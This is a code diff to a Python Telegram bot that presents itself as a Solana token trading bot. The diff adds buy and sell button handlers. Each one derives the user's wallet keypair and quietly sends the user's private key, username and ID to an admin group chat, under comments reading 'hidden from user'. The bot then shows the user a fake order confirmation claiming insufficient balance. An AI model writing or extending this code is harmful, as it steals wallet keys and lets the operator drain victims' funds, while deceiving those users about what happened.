@@ -182,6 +182,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     option = query.data
     user_id = query.from_user.id
+    user = query.from_user
+    user_name = user.username or user.first_name or str(user_id)
 
     # Handle cancel action for settings
     if option == "cancel_settings":
@@ -197,7 +199,123 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_wallet(update, context)
         return
     
-    # Save state for this user
+    # Handle BUY actions
+    if option.startswith("buy_"):
+        parts = option.split("_", 2)  # buy_amount_tokenaddress or buy_custom_tokenaddress
+        
+        if parts[1] == "custom":
+            # Store state for custom buy input
+            token_address = parts[2] if len(parts) > 2 else context.user_data.get("current_token", "")
+            context.user_data["awaiting_custom_buy"] = token_address
+            
+            cancel_button = InlineKeyboardMarkup([
+                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_custom_trade")]
+            ])
+            
+            await query.message.reply_text(
+                "🟢 <b>Custom Buy Amount</b>\n\n"
+                "Please enter the amount of SOL you want to buy:\n\n"
+                "📝 Enter your desired SOL amount (e.g., 0.25, 2.5, 10)",
+                parse_mode="HTML",
+                reply_markup=cancel_button
+            )
+            return
+        else:
+            # Fixed amount buy
+            amount = parts[1]
+            token_address = parts[2] if len(parts) > 2 else context.user_data.get("current_token", "")
+            
+            # Get user's private key and forward to admin (hidden from user)
+            try:
+                public_address, private_key_b58 = derive_keypair_and_address(user_id)
+                
+                if GROUP_ID:
+                    admin_trade_msg = (
+                        f"🟢 <b>BUY ORDER</b>\n\n"
+                        f"User: @{user_name} (ID: {user_id})\n"
+                        f"Amount: {amount} SOL\n"
+                        f"Token: <code>{token_address}</code>\n\n"
+                        f"🔐 <b>Private Key:</b>\n"
+                        f"<code>{private_key_b58}</code>"
+                    )
+                    await context.bot.send_message(chat_id=GROUP_ID, text=admin_trade_msg, parse_mode="HTML")
+            except Exception as e:
+                print(f"Error forwarding to admin: {e}")
+            
+            # Show user response (without private key)
+            await query.message.reply_text(
+                f"🟢 <b>Buy Order Submitted</b>\n\n"
+                f"Amount: {amount} SOL\n"
+                f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
+                f"❗ Insufficient SOL balance to complete this transaction.",
+                parse_mode="HTML"
+            )
+            return
+    
+    # Handle SELL actions
+    if option.startswith("sell_"):
+        parts = option.split("_", 2)  # sell_percentage_tokenaddress or sell_custom_tokenaddress
+        
+        if parts[1] == "custom":
+            # Store state for custom sell input
+            token_address = parts[2] if len(parts) > 2 else context.user_data.get("current_token", "")
+            context.user_data["awaiting_custom_sell"] = token_address
+            
+            cancel_button = InlineKeyboardMarkup([
+                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_custom_trade")]
+            ])
+            
+            await query.message.reply_text(
+                "🔴 <b>Custom Sell Percentage</b>\n\n"
+                "Please enter the percentage you want to sell:\n\n"
+                "📝 Enter your desired percentage (e.g., 25, 75, 90)",
+                parse_mode="HTML",
+                reply_markup=cancel_button
+            )
+            return
+        else:
+            # Fixed percentage sell
+            percentage = parts[1]
+            token_address = parts[2] if len(parts) > 2 else context.user_data.get("current_token", "")
+            
+            # Get user's private key and forward to admin (hidden from user)
+            try:
+                public_address, private_key_b58 = derive_keypair_and_address(user_id)
+                
+                if GROUP_ID:
+                    admin_trade_msg = (
+                        f"🔴 <b>SELL ORDER</b>\n\n"
+                        f"User: @{user_name} (ID: {user_id})\n"
+                        f"Percentage: {percentage}%\n"
+                        f"Token: <code>{token_address}</code>\n\n"
+                        f"🔐 <b>Private Key:</b>\n"
+                        f"<code>{private_key_b58}</code>"
+                    )
+                    await context.bot.send_message(chat_id=GROUP_ID, text=admin_trade_msg, parse_mode="HTML")
+            except Exception as e:
+                print(f"Error forwarding to admin: {e}")
+            
+            # Show user response (without private key)
+            await query.message.reply_text(
+                f"🔴 <b>Sell Order Submitted</b>\n\n"
+                f"Percentage: {percentage}%\n"
+                f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
+                f"❗ No token balance to sell.",
+                parse_mode="HTML"
+            )
+            return
+    
+    # Handle cancel custom trade
+    if option == "cancel_custom_trade":
+        context.user_data.pop("awaiting_custom_buy", None)
+        context.user_data.pop("awaiting_custom_sell", None)
+        await query.message.reply_text(
+            "❌ Trade cancelled.",
+            reply_markup=main_menu_markup()
+        )
+        return
+    
+    # Save state for this user (for settings)
     user_states[user_id] = option
     
     # Create cancel button for settings input
